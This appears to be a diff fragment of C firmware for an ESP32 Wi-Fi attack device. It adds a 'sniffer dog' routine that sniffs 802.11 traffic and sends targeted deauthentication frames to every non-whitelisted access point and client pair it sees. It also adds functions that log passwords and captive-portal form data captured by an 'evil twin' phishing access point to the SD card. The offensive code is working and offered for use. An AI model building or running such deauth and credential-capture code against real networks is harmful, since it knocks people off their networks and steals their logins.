+            sniffer_dog_channel_hop();
+        }
+    }
+    
+    MY_LOG_INFO(TAG, "Sniffer Dog channel task ending");
+    sniffer_dog_task_handle = NULL;
+    vTaskDelete(NULL);
+}
+
+// Promiscuous callback for sniffer_dog - captures AP-STA pairs and sends deauth
+static void sniffer_dog_promiscuous_callback(void *buf, wifi_promiscuous_pkt_type_t type) {
+    static uint32_t deauth_sent_count = 0;
+    
+    if (!sniffer_dog_active) {
+        return;
+    }
+    
+    // Filter only MGMT and DATA packets
+    if (type != WIFI_PKT_DATA && type != WIFI_PKT_MGMT) {
+        return;
+    }
+    
+    const wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
+    const uint8_t *frame = pkt->payload;
+    int len = pkt->rx_ctrl.sig_len;
+    
+    if (len < 24) { // Minimum 802.11 header size
+        return;
+    }
+    
+    // Parse 802.11 header
+    uint8_t frame_type = frame[0] & 0xFC;
+    uint8_t to_ds = (frame[1] & 0x01) != 0;
+    uint8_t from_ds = (frame[1] & 0x02) != 0;
+    
+    // Extract addresses
+    uint8_t *addr1 = (uint8_t *)&frame[4];   // Address 1
+    uint8_t *addr2 = (uint8_t *)&frame[10];  // Address 2  
+    //uint8_t *addr3 = (uint8_t *)&frame[16];  // Address 3
+    
+    uint8_t *ap_mac = NULL;
+    uint8_t *sta_mac = NULL;
+    
+    // Identify AP and STA based on frame type and DS bits
+    if (type == WIFI_PKT_DATA) {
+        // For DATA frames, use DS bits to determine direction
+        if (to_ds && !from_ds) {
+            // STA -> AP
+            sta_mac = addr2;  // Source is STA
+            ap_mac = addr1;   // Destination is AP (BSSID)
+        } else if (!to_ds && from_ds) {
+            // AP -> STA
+            ap_mac = addr2;   // Source is AP (BSSID)
+            sta_mac = addr1;  // Destination is STA
+        } else if (to_ds && from_ds) {
+            // WDS (Wireless Distribution System) - skip
+            return;
+        } else {
+            // Ad-hoc or other - skip
+            return;
+        }
+    } else if (type == WIFI_PKT_MGMT) {
+        // For MGMT frames, analyze frame type
+        switch (frame_type) {
+            case 0x00: // Association Request
+            case 0x20: // Reassociation Request
+            case 0xB0: // Authentication
+                sta_mac = addr2; // Source is STA
+                ap_mac = addr1;  // Destination is AP
+                break;
+                
+            case 0x10: // Association Response
+            case 0x30: // Reassociation Response
+                ap_mac = addr2;  // Source is AP
+                sta_mac = addr1; // Destination is STA
+                break;
+                
+            case 0x80: // Beacon
+            case 0x40: // Probe Request
+            case 0x50: // Probe Response
+                // Skip - not AP-STA pairs
+                return;
+                
+            default:
+                // Unknown or not relevant
+                return;
+        }
+    }
+    
+    // Validate AP and STA addresses
+    if (!ap_mac || !sta_mac) {
+        return;
+    }
+    
+    // Skip broadcast/multicast addresses
+    if (is_broadcast_bssid(ap_mac) || is_broadcast_bssid(sta_mac) ||
+        is_multicast_mac(ap_mac) || is_multicast_mac(sta_mac) ||
+        is_own_device_mac(ap_mac) || is_own_device_mac(sta_mac)) {
+        return;
+    }
+    
+    // Check if AP BSSID is whitelisted - skip if it is
+    if (is_bssid_whitelisted(ap_mac)) {
+        return; // Silently skip whitelisted networks
+    }
+    
+    // We have a valid AP-STA pair! Send 5 deauth packets
+    // Create deauth frame from AP to STA (not broadcast!)
+    uint8_t deauth_frame[sizeof(deauth_frame_default)];
+    memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
+    
+    // Set destination to specific STA (not broadcast!)
+    memcpy(&deauth_frame[4], sta_mac, 6);
+    // Set source to AP
+    memcpy(&deauth_frame[10], ap_mac, 6);
+    // Set BSSID to AP
+    memcpy(&deauth_frame[16], ap_mac, 6);
+    
+    // Send deauth frame for more effective disconnection
+
+    // Blue LED flash to indicate deauth sent
+    led_strip_set_pixel(strip, 0, 0, 0, 255); // Blue
+    led_strip_refresh(strip);
+
+    wsl_bypasser_send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
+    deauth_sent_count++;
+    
+    led_strip_set_pixel(strip, 0, 255, 0, 0); // Back to red
+    led_strip_refresh(strip);
+    
+    // Log statistics for this AP-STA pair
+    MY_LOG_INFO(TAG, "[SnifferDog #%lu] DEAUTH sent: AP=%02X:%02X:%02X:%02X:%02X:%02X -> STA=%02X:%02X:%02X:%02X:%02X:%02X (Ch=%d, RSSI=%d)",
+               deauth_sent_count,
+               ap_mac[0], ap_mac[1], ap_mac[2], ap_mac[3], ap_mac[4], ap_mac[5],
+               sta_mac[0], sta_mac[1], sta_mac[2], sta_mac[3], sta_mac[4], sta_mac[5],
+               sniffer_dog_current_channel, pkt->rx_ctrl.rssi);
+}
+
 // === WARDRIVE HELPER FUNCTIONS ===
 
 static esp_err_t init_gps_uart(void) {
@@ -4383,7 +5078,7 @@ static esp_err_t init_sd_card(void) {
     // Options for mounting the filesystem (optimized for low memory)
     esp_vfs_fat_sdmmc_mount_config_t mount_config = {
         .format_if_mount_failed = false,  // Don't format automatically to save memory
-        .max_files = 3,                   // Reduced from 10 to 3 to save memory
+        .max_files = 5,                   // Increased to 5 for password logging
         .allocation_unit_size = 0,        // Use default (512 bytes) to save memory
         .disk_status_check_enable = false
     };
@@ -4619,6 +5314,259 @@ static int find_next_wardrive_file_number(void) {
     MY_LOG_INFO(TAG, "Highest existing file number: %d, next will be: %d", max_number, next_number);
     
     return next_number;
+}
+
+// Save evil twin password to SD card
+static void save_evil_twin_password(const char* ssid, const char* password) {
+    // Initialize SD card if not already mounted
+    esp_err_t ret = init_sd_card();
+    if (ret != ESP_OK) {
+        MY_LOG_INFO(TAG, "Failed to initialize SD card for password logging: %s", esp_err_to_name(ret));
+        return;
+    }
+    
+    // Check if /sdcard directory is accessible
+    struct stat st;
+    if (stat("/sdcard", &st) != 0) {
+        MY_LOG_INFO(TAG, "Error: /sdcard directory not accessible");
+        return;
+    }
+    
+    // Try to open file for appending (use short name without underscore for FAT compatibility)
+    FILE *file = fopen("/sdcard/eviltwin.txt", "a");
+    if (file == NULL) {
+        MY_LOG_INFO(TAG, "Failed to open eviltwin.txt for append, errno: %d (%s). Trying to create...", errno, strerror(errno));
+        
+        // Try to create the file first
+        file = fopen("/sdcard/eviltwin.txt", "w");
+        if (file == NULL) {
+            MY_LOG_INFO(TAG, "Failed to create eviltwin.txt, errno: %d (%s)", errno, strerror(errno));
+            return;
+        }
+        // Close and reopen in append mode
+        fclose(file);
+        file = fopen("/sdcard/eviltwin.txt", "a");
+        if (file == NULL) {
+            MY_LOG_INFO(TAG, "Failed to reopen eviltwin.txt, errno: %d (%s)", errno, strerror(errno));
+            return;
+        }
+        MY_LOG_INFO(TAG, "Successfully created eviltwin.txt");
+    }
+    
+    // Write SSID and password in CSV format
+    fprintf(file, "\"%s\", \"%s\"\n", ssid, password);
+    
+    // Flush and close file to ensure data is written to disk
+    fflush(file);
+    fclose(file);
+    
+    MY_LOG_INFO(TAG, "Password saved to eviltwin.txt");
+}
+
+// Save portal form data to SD card
+static void save_portal_data(const char* ssid, const char* form_data) {
+    // Initialize SD card if not already mounted
+    esp_err_t ret = init_sd_card();
+    if (ret != ESP_OK) {
+        MY_LOG_INFO(TAG, "Failed to initialize SD card for portal data logging: %s", esp_err_to_name(ret));
+        return;
+    }
+    
+    // Check if /sdcard directory is accessible
+    struct stat st;
+    if (stat("/sdcard", &st) != 0) {
+        MY_LOG_INFO(TAG, "Error: /sdcard directory not accessible");
+        return;
+    }
+    
+    // Try to open file for appending
+    FILE *file = fopen("/sdcard/portals.txt", "a");
+    if (file == NULL) {
+        MY_LOG_INFO(TAG, "Failed to open portals.txt for append, errno: %d (%s). Trying to create...", errno, strerror(errno));
+        
+        // Try to create the file first
+        file = fopen("/sdcard/portals.txt", "w");
+        if (file == NULL) {
+            MY_LOG_INFO(TAG, "Failed to create portals.txt, errno: %d (%s)", errno, strerror(errno));
+            return;
+        }
+        // Close and reopen in append mode
+        fclose(file);
+        file = fopen("/sdcard/portals.txt", "a");
+        if (file == NULL) {
+            MY_LOG_INFO(TAG, "Failed to reopen portals.txt, errno: %d (%s)", errno, strerror(errno));
+            return;
+        }
+        MY_LOG_INFO(TAG, "Successfully created portals.txt");
+    }
+    
+    // Write SSID as first field
+    fprintf(file, "\"%s\", ", ssid ? ssid : "Unknown");
+    
+    // Parse form data and extract all fields
+    // Form data is in format: field1=value1&field2=value2&...
+    char *data_copy = strdup(form_data);
+    if (data_copy == NULL) {
+        fclose(file);
+        return;
+    }
+    
+    // Count fields first to properly format CSV
+    int field_count = 0;
+    char *temp_copy = strdup(form_data);
+    if (temp_copy == NULL) {
+        MY_LOG_INFO(TAG, "Memory allocation failed for temp_copy");
+        free(data_copy);
+        fclose(file);
+        return;
+    }
+    
+    char *token = strtok(temp_copy, "&");
+    while (token != NULL) {
+        field_count++;
+        token = strtok(NULL, "&");
+    }
+    free(temp_copy);
+    
+    // Now process each field
+    int current_field = 0;
+    token = strtok(data_copy, "&");
+    while (token != NULL) {
+        char *equals = strchr(token, '=');
+        if (equals != NULL) {
+            *equals = '\0';
+            char *value = equals + 1;
+            
+            // URL decode the value
+            char decoded_value[128];
+            int decoded_len = 0;
+            for (char *p = value; *p && decoded_len < sizeof(decoded_value) - 1; p++) {
+                if (*p == '%' && p[1] && p[2]) {
+                    char hex[3] = {p[1], p[2], '\0'};
+                    decoded_value[decoded_len++] = (char)strtol(hex, NULL, 16);
+                    p += 2;
+                } else if (*p == '+') {
+                    decoded_value[decoded_len++] = ' ';
+                } else {
+                    decoded_value[decoded_len++] = *p;
+                }
+            }
+            decoded_value[decoded_len] = '\0';
+            
+            // Write field value in CSV format
+            fprintf(file, "\"%s\"", decoded_value);
+            
+            // Add comma if not last field
+            current_field++;
+            if (current_field < field_count) {
+                fprintf(file, ", ");
+            }
+        }
+        token = strtok(NULL, "&");
+    }
+    
+    // End line
+    fprintf(file, "\n");
+    
+    // Flush and close file to ensure data is written to disk
+    fflush(file);
+    fclose(file);
+    
+    free(data_copy);
+    
+    MY_LOG_INFO(TAG, "Portal data saved to portals.txt");
+}
+
+// Load whitelist from SD card
+static void load_whitelist_from_sd(void) {
+    whitelistedBssidsCount = 0; // Reset count
+    
+    MY_LOG_INFO(TAG, "Checking for whitelist file (white.txt) on SD card...");
+    
+    // Try to initialize SD card (silently fail if not available)
+    esp_err_t ret = init_sd_card();
+    if (ret != ESP_OK) {
+        MY_LOG_INFO(TAG, "SD card not available - whitelist will be empty");
+        return;
+    }
+    
+    // Try to open white.txt file
+    FILE *file = fopen("/sdcard/white.txt", "r");
+    if (file == NULL) {
+        MY_LOG_INFO(TAG, "white.txt not found on SD card - whitelist will be empty");
+        return;
+    }
+    
+    MY_LOG_INFO(TAG, "Found white.txt, loading whitelisted BSSIDs...");
+    
+    char line[128];
+    int line_number = 0;
+    int loaded_count = 0;
+    
+    while (fgets(line, sizeof(line), file) != NULL && whitelistedBssidsCount < MAX_WHITELISTED_BSSIDS) {
+        line_number++;
+        
+        // Remove trailing newline/whitespace
+        line[strcspn(line, "\r\n")] = '\0';
+        
+        // Skip empty lines
+        if (strlen(line) == 0) {
+            continue;
+        }
+        
+        // Parse BSSID in format: XX:XX:XX:XX:XX:XX or XX-XX-XX-XX-XX-XX
+        uint8_t bssid[6];
+        int matches = 0;
+        
+        // Try with colon separator
+        matches = sscanf(line, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
+                        &bssid[0], &bssid[1], &bssid[2],
+                        &bssid[3], &bssid[4], &bssid[5]);
+        
+        // If that didn't work, try with dash separator
+        if (matches != 6) {
+            matches = sscanf(line, "%hhx-%hhx-%hhx-%hhx-%hhx-%hhx",
+                            &bssid[0], &bssid[1], &bssid[2],
+                            &bssid[3], &bssid[4], &bssid[5]);
+        }
+        
+        if (matches == 6) {
+            // Valid BSSID found, add to whitelist
+            memcpy(whiteListedBssids[whitelistedBssidsCount].bssid, bssid, 6);
+            whitelistedBssidsCount++;
+            loaded_count++;
+            
+            MY_LOG_INFO(TAG, "  [%d] Loaded: %02X:%02X:%02X:%02X:%02X:%02X",
+                       loaded_count,
+                       bssid[0], bssid[1], bssid[2],
+                       bssid[3], bssid[4], bssid[5]);
+        } else {
+            MY_LOG_INFO(TAG, "  Line %d: Invalid BSSID format, ignoring: %s", line_number, line);
+        }
+    }
+    
+    fclose(file);
+    
+    if (whitelistedBssidsCount > 0) {
+        MY_LOG_INFO(TAG, "Successfully loaded %d whitelisted BSSID(s)", whitelistedBssidsCount);
+    } else {
+        MY_LOG_INFO(TAG, "No valid BSSIDs found in white.txt");
+    }
+}
+
+// Check if a BSSID is in the whitelist
+static bool is_bssid_whitelisted(const uint8_t *bssid) {
+    if (bssid == NULL || whitelistedBssidsCount == 0) {
+        return false;
+    }
+    
+    for (int i = 0; i < whitelistedBssidsCount; i++) {
+        if (memcmp(bssid, whiteListedBssids[i].bssid, 6) == 0) {
+            return true;
+        }
+    }
+    
+    return false;
 }
 
 
